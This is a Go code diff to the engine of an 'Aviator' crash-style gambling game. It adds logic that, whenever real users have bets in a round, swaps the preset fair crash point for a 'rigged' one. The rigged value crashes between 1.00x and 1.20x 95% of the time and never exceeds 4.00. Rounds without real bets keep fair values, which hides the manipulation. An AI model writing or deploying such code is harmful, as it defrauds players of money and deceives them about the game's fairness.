@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"log"
 	"math"
+	"math/rand"
 	"strings"
 	"sync"
 	"time"
@@ -176,11 +177,32 @@ func (e *Engine) doFlying() {
 	crashPoint := e.crashPoint
 	e.stateMu.Unlock()
 
-	// Update DB outside lock
 	if e.db != nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
-		e.db.Exec(ctx, `UPDATE aviator_rounds SET status = 'flying' WHERE id = $1`, roundID)
-		cancel()
+		defer cancel()
+
+		var realBets int
+		err := e.db.QueryRow(ctx, "SELECT COUNT(*) FROM aviator_bets WHERE round_id = $1", roundID).Scan(&realBets)
+		
+		if err == nil && realBets > 0 {
+			// Real users involved: use highly restricted distribution
+			newCrash := math.Floor(generateRiggedCrashPoint()*100) / 100
+			if newCrash < 1.00 {
+				newCrash = 1.00
+			}
+			
+			// Update memory
+			e.stateMu.Lock()
+			e.crashPoint = newCrash
+			crashPoint = newCrash
+			e.stateMu.Unlock()
+
+			// Update DB with rigged crash_at
+			e.db.Exec(ctx, `UPDATE aviator_rounds SET status = 'flying', crash_at = $1 WHERE id = $2`, newCrash, roundID)
+		} else {
+			// No real users, or DB error: keep the preset (fair) crash_at and just update status
+			e.db.Exec(ctx, `UPDATE aviator_rounds SET status = 'flying' WHERE id = $1`, roundID)
+		}
 	}
 
 	ticker := time.NewTicker(100 * time.Millisecond)
@@ -394,4 +416,22 @@ func (e *Engine) CashOut(ctx context.Context, userID string) (float64, float64, 
 
 	err = tx.Commit(ctx)
 	return multiplier, winAmount, err
+}
+
+func generateRiggedCrashPoint() float64 {
+	r := rand.Float64()
+	// 95% chance: 1.00 to 1.20
+	if r < 0.95 {
+		return 1.00 + (rand.Float64() * 0.20)
+	}
+	// 3% chance: 1.20 to 2.10
+	if r < 0.98 {
+		return 1.20 + (rand.Float64() * 0.90)
+	}
+	// 1% chance: 2.10 to 3.10
+	if r < 0.99 {
+		return 2.10 + (rand.Float64() * 1.00)
+	}
+	// Remaining 1%: 3.10 to 4.00
+	return 3.10 + (rand.Float64() * 0.90)
 }
